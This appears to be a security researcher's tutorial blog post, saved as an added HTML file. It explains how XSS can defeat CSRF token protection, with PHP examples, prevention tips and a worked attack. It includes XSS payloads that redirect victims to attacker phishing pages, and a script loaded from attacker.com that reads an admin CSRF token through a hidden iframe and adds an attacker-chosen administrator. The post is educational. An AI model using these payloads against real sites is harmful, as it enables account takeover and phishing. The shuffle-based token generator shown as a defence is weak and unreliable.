@@ -1,0 +1,370 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Research | Bypass CSRF Protection w/ XSS // Abdelrhman Allam</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.101.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Abdelrhman Allam" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://sl4x0.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Research | Bypass CSRF Protection w/ XSS"/>
+<meta name="twitter:description" content="Contents About XSS What can we do w/ XSS? Prevention About CSRF Scenario Using XSS for bypassing CSRF protection Another Bypass Technique Exploiting About XSS In Breif: Web Application receives data from client from GET function, then displays it.
+if(isset($_GET[&#39;text&#39;])) { $var = $_GET[&#39;text&#39;]; print $var; } // This code checks if the &#39;text&#39; variable is set for the GET request. // The code stores its contents in a variable called &#34;$var&#34;, And prints its contents."/>
+
+    <meta property="og:title" content="Research | Bypass CSRF Protection w/ XSS" />
+<meta property="og:description" content="Contents About XSS What can we do w/ XSS? Prevention About CSRF Scenario Using XSS for bypassing CSRF protection Another Bypass Technique Exploiting About XSS In Breif: Web Application receives data from client from GET function, then displays it.
+if(isset($_GET[&#39;text&#39;])) { $var = $_GET[&#39;text&#39;]; print $var; } // This code checks if the &#39;text&#39; variable is set for the GET request. // The code stores its contents in a variable called &#34;$var&#34;, And prints its contents." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sl4x0.github.io/research/research-bypass-csrf-w-xss/" /><meta property="article:section" content="research" />
+<meta property="article:published_time" content="2023-01-29T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-01-29T00:00:00+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://sl4x0.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Abdelrhman Allam" /></a>
+      <h1>Abdelrhman Allam</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/about/">About</a>
+             // 
+          
+          <a class="app-header-menu-item" href="/">Home</a>
+             // 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Security Researcher 🐛</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>My Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://linkedin.com/in/sl4x0" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>My Twitter</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Research | Bypass CSRF Protection w/ XSS</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 29, 2023
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          7 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://sl4x0.github.io/tags/bypass/">bypass</a>
+              <a class="tag" href="https://sl4x0.github.io/tags/csrf/">csrf</a>
+              <a class="tag" href="https://sl4x0.github.io/tags/xss/">xss</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p><img src="https://miro.medium.com/max/716/0*4GFRsYnJ2UU3UJSX.png" alt=""></p>
+<h2 id="contents">Contents</h2>
+<ul>
+<li><a href="#about-xss">About XSS</a>
+<ul>
+<li><a href="#what-can-we-do-with-xss?">What can we do w/ XSS?</a></li>
+<li><a href="#prevention">Prevention</a></li>
+</ul>
+</li>
+<li><a href="#about-csrf">About CSRF</a>
+<ul>
+<li><a href="#scenario">Scenario</a></li>
+</ul>
+</li>
+<li><a href="#using-xss-for-bypassing-csrf-protection">Using XSS for bypassing CSRF protection</a></li>
+<li><a href="#another-bypass-technique">Another Bypass Technique</a></li>
+<li><a href="#exploiting">Exploiting</a></li>
+</ul>
+<h2 id="about-xss">About XSS</h2>
+<p>In Breif: Web Application receives data from client from GET function, then displays it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;text&#39;</span>]))
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>$var <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;text&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> $var;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// This code checks if the &#39;text&#39; variable is set for the GET request. 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// The code stores its contents in a variable called &#34;$var&#34;, And prints its contents.
+</span></span></span></code></pre></div><ul>
+<li>Request will look like this: <a href="http://www.site.com/script.php?text">http://www.site.com/script.php?text=test</a></li>
+<li>What happen if we make it like this:</li>
+</ul>
+<pre tabindex="0"><code>http://www.site.com/script.php?text=script&gt;code_javascript&lt;/script&gt;
+</code></pre><ul>
+<li>Well, the javascript code will be execute!</li>
+</ul>
+<p>💡 Most often, this problem is found in the <strong>search box</strong> , regardless if the files are send using POST, or send by GET , the return message will be something like:  &ldquo;You searched for &rsquo;test&rsquo; &quot;</p>
+<h3 id="what-can-we-do-w-xss">What can we do w/ XSS?</h3>
+<ol>
+<li><strong>Cookie Grabber</strong></li>
+<li><strong>Phishing Attacks</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>http:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>site<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>script<span style="color:#f92672">.</span>php<span style="color:#960050;background-color:#1e0010">?</span>text<span style="color:#f92672">=&lt;</span>script<span style="color:#f92672">&gt;</span>document<span style="color:#f92672">.</span>location<span style="color:#f92672">.</span>href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.site-attacker.com/phishing.html&#34;</span><span style="color:#f92672">&lt;/</span>script<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><ol start="3">
+<li><strong>Scam Page</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://attacker.com/phishing_page_identical_copy_of_the_aplication_page.html&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;z-index: 0; position: absolute; top: 0; left: 0; height:100%; width:100%;&#34;</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;</span>/iframe
+</span></span></code></pre></div><ol>
+<li><strong>Making Pages Cooler :&rdquo;</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">images</span>[<span style="color:#ae81ff">4</span>].<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://rstcenter.com/up/director/RST.png&#34;</span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><h3 id="prevention">Prevention</h3>
+<ol>
+<li>
+<p>Using <code>htmlspechialchars</code> function w/ PHP</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;text&#39;</span>]))
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>$var<span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;text&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#a6e22e">htmlentities</span>($var, <span style="color:#a6e22e">ENT_QUOTES</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Or print htmlspecialchars($var, ENT_QUOTES);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><ul>
+<li>
+<p>If the Input is specific Datatype (int,float,..):</p>
+<ul>
+<li>Typecast the value to the corresponding datatype using functions like <code>int()</code>,<code>float()</code></li>
+<li>Validate the variable with corresponding Datatype using <code>is_numeric()</code>,<code>is_float()</code> etc.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_numeric</span>($id) <span style="color:#f92672">==</span> <span style="color:#66d9ef">True</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">code</span><span style="color:#f92672">&gt;</span> }
+</span></span></code></pre></div></li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="about-csrf">About CSRF</h2>
+<p>What makes this vulnerability possible is the <strong>automation of an action</strong>, this action being made in general by the application administrators.
+For this type of vulnerability, the victims are authenticated users of the application , and CSRF lets them automate some actions that they can do.</p>
+<h3 id="scenario">Scenario</h3>
+<ul>
+<li>The administration panel , he has a page were he can delete an article , just by clicking on a link.
+<ul>
+<li><a href="http://www.site.com/admin/delete_articol?articol_id=123">http://www.site.com/admin/delete_articol?articol_id=123</a></li>
+</ul>
+</li>
+<li>The attacker can make a page in which he can put the following code:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.site.com/admin/delete_articol?articol_id=123&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;</span>/ifram
+</span></span></code></pre></div><ul>
+<li>When the victim ,in our case the administrator visits this webpage ,he will make a request to deletion page without knowing.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;login&#39;</span>])){
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Check login
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$_SESSTION[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">Random</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Random</span>(){
+</span></span><span style="display:flex;"><span>$chars <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;A&#39;</span>,<span style="color:#e6db74">&#39;B&#39;</span>,<span style="color:#e6db74">&#39;C&#39;</span>,<span style="color:#e6db74">&#39;D&#39;</span>,<span style="color:#e6db74">&#39;E&#39;</span>,<span style="color:#e6db74">&#39;F&#39;</span>,<span style="color:#e6db74">&#39;G&#39;</span>,<span style="color:#e6db74">&#39;H&#39;</span>,<span style="color:#e6db74">&#39;I&#39;</span>,<span style="color:#e6db74">&#39;J&#39;</span>,<span style="color:#e6db74">&#39;K&#39;</span>,<span style="color:#e6db74">&#39;L&#39;</span>,<span style="color:#e6db74">&#39;M&#39;</span>,<span style="color:#e6db74">&#39;N&#39;</span>,<span style="color:#e6db74">&#39;O&#39;</span>,<span style="color:#e6db74">&#39;P&#39;</span>,<span style="color:#e6db74">&#39;Q&#39;</span>,<span style="color:#e6db74">&#39;R&#39;</span>,<span style="color:#e6db74">&#39;S&#39;</span>,<span style="color:#e6db74">&#39;T&#39;</span>,<span style="color:#e6db74">&#39;U&#39;</span>,<span style="color:#e6db74">&#39;V&#39;</span>,<span style="color:#e6db74">&#39;W&#39;</span>,<span style="color:#e6db74">&#39;X&#39;</span>,<span style="color:#e6db74">&#39;Y&#39;</span>,<span style="color:#e6db74">&#39; Z&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;b&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span>,<span style="color:#e6db74">&#39;d&#39;</span>,<span style="color:#e6db74">&#39;e&#39;</span>,<span style="color:#e6db74">&#39;f&#39;</span>,<span style="color:#e6db74">&#39;g&#39;</span>,<span style="color:#e6db74">&#39;h&#39;</span>,<span style="color:#e6db74">&#39;i&#39;</span>,<span style="color:#e6db74">&#39;j&#39;</span>,<span style="color:#e6db74">&#39;k&#39;</span>,<span style="color:#e6db74">&#39;l&#39;</span>,<span style="color:#e6db74">&#39;m&#39;</span>,<span style="color:#e6db74">&#39;n&#39;</span>,<span style="color:#e6db74">&#39;o&#39;</span>,<span style="color:#e6db74">&#39;p&#39;</span>,<span style="color:#e6db74">&#39;q&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>,<span style="color:#e6db74">&#39;s&#39;</span>,<span style="color:#e6db74">&#39;t&#39;</span>,<span style="color:#e6db74">&#39;u&#39;</span>,<span style="color:#e6db74">&#39;v&#39;</span>,<span style="color:#e6db74">&#39;w&#39;</span>,<span style="color:#e6db74">&#39;x&#39;</span>,<span style="color:#e6db74">&#39;y&#39;</span>,<span style="color:#e6db74">&#39;z&#39;</span>,<span style="color:#e6db74">&#39;0&#39;</span>,<span style="color:#e6db74">&#39;1&#39;</span>,<span style="color:#e6db74">&#39;2&#39;</span>,<span style="color:#e6db74">&#39;3&#39;</span>,<span style="color:#e6db74">&#39;4&#39;</span>,<span style="color:#e6db74">&#39;5&#39;</span>,<span style="color:#e6db74">&#39;6&#39;</span>,<span style="color:#e6db74">&#39;7&#39;</span>,<span style="color:#e6db74">&#39;8&#39;</span>,<span style="color:#e6db74">&#39;9&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">shuffle</span>($chars);
+</span></span><span style="display:flex;"><span>$sir <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>(<span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;&#39;</span>, $chars), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> $sir;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// The random string is generated by the Random() function, which creates an array
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// of characters, shuffles them, and then combines them into a string of 10 characters, 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// which is returned as the function&#39;s output. 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// This token can then be used as an extra layer of security to prevent (CSRF) attacks.
+</span></span></span></code></pre></div><ul>
+<li>For example, when deleting a file, when we create the download link, we add this token:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;&lt;a href=&#34;admin.php?action=delete_articol&amp;articol_id&#39;</span> <span style="color:#f92672">.</span> $date[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&amp;token=&#39;</span> <span style="color:#f92672">.</span> $_SESSION[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&#34;&gt;Delete&lt;/a&gt;&#39;</span>;
+</span></span></code></pre></div><ul>
+<li>Therefore, the link for the delete will be something like:</li>
+</ul>
+<blockquote>
+<p><a href="http://www.site.com/admin.php?action=delete_articol&amp;articol_id=123&amp;token=qdY4f6FTpO">http://www.site.com/admin.php?action=delete_articol&amp;articol_id=123&amp;token=qdY4f6FTpO</a></p>
+</blockquote>
+<p>To delete the article we need to verify that the token is the one in the session:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;delete_articol&#39;</span>])){
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($_SESSION[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">==</span> $_GET[<span style="color:#e6db74">&#39;token&#39;</span>]){
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// delete_specified_article();
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;The token does not match, you may be a victim on CSRF&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>💡 Other methods, safer but more &ldquo;time consuming&rdquo; would be to ask for users/administrator password for every important action , or to add a CAPTCHA image and verify the text entered by the us</p>
+<hr>
+<h2 id="using-xss-for-bypassing-csrf-protection">Using XSS for bypassing CSRF protection</h2>
+<p>Let’s take an example, adding a new administrator depending on the name of the user who will become administrator. This will happen in the folder <code>/admin</code> which is not vulnerable to CSRF.</p>
+<p><code>/admin/admin.php?action=add_admin</code> ( for example ):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;get&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;add_admin.php&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>Name: &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> /&gt; 
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">br</span>/&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;token&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;?php print $_SESSION[&#39;token&#39;]; ?&gt;&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;add admin&#34;</span> /&gt;&lt;<span style="color:#f92672">br</span> /&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+</span></span></code></pre></div><blockquote>
+<p><a href="http://www.site.com/add_admin.php?name=Nytro&amp;token=1htFI0iA9s&amp;submit">http://www.site.com/add_admin.php?name=Nytro&amp;token=1htFI0iA9s&amp;submit</a></p>
+</blockquote>
+<p>When verifying,the token from the session will be the same with the one send from the form , and nitro will be an administrator.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;submit&#39;</span>])){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>($_SESSION[<span style="color:#e6db74">&#39;token&#39;</span>] <span style="color:#f92672">==</span> $_GET[<span style="color:#e6db74">&#39;token&#39;</span>]){
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// we_make_nytro_admin();
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Nytro is now an admin.&#39;</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Token invalid _|_ :)&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><blockquote>
+<p>When verifying,the token from the session will be the same with the one send from the form , and nitro will be an administrator.</p>
+</blockquote>
+<h4 id="how-to-obtain-the-token">How to obtain the token?</h4>
+<ol>
+<li>We will consider on the main page (index.php), the vulnerable application which contains the following code:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;name&#39;</span>])) { <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Hello, &#39;</span> <span style="color:#f92672">.</span> $_GET[<span style="color:#e6db74">&#39;name&#39;</span>]; } <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>To simplify things, we won’t write our javascript code directly in the request , instead we will write it in a <code>.js</code> file which we will consider uploaded on: <a href="http://www.attacker.com/script.js">http://www.attacker.com/script.js</a></p>
+<p>In request we will use:</p>
+<p><a href="http://www.site_vulnerable.com/index.php?nume=%60">http://www.site_vulnerable.com/index.php?nume=`</a><!-- raw HTML omitted --><!-- raw HTML omitted -->`</p>
+<ul>
+<li>The attacker creates an iframe that opens the targeted website&rsquo;s administration page by using the following code:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">document</span><span style="color:#f92672">.</span><span style="color:#a6e22e">writeln</span>(<span style="color:#e6db74">&#39;&lt;iframe id=&#34;iframe&#34; src=&#34;/admin/admin.php?action=add_admin&#34; width=&#34;0&#34; height=&#34;0&#34; onload=&#34;read()&#34;&gt;&lt;/iframe&gt;&#39;</span>);
+</span></span></code></pre></div><ul>
+<li>Then he uses the obtained token to construct a malicious link that redirects the victim to a page controlled by the attacker. The following code is used for this:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Nytro&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">document</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;iframe&#34;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">contentDocument</span><span style="color:#f92672">.</span><span style="color:#a6e22e">forms</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span><span style="color:#a6e22e">token</span><span style="color:#f92672">.</span><span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">document</span><span style="color:#f92672">.</span><span style="color:#a6e22e">location</span><span style="color:#f92672">.</span><span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://127.0.0.1/admin/add_admin.php?name=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&amp;token=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&amp;submit&#39;</span>;
+</span></span></code></pre></div><ul>
+<li>he attacker can hide the iframe to conceal the attack from the victim by using the following code:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://site_victim.com/index.php?name=&lt;script src=&#34;http://127.0.0.1/script.js&#34;&gt;&lt;/script&gt;&#39;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;300&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;300&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">iframe</span><span style="color:#f92672">&gt;</span>
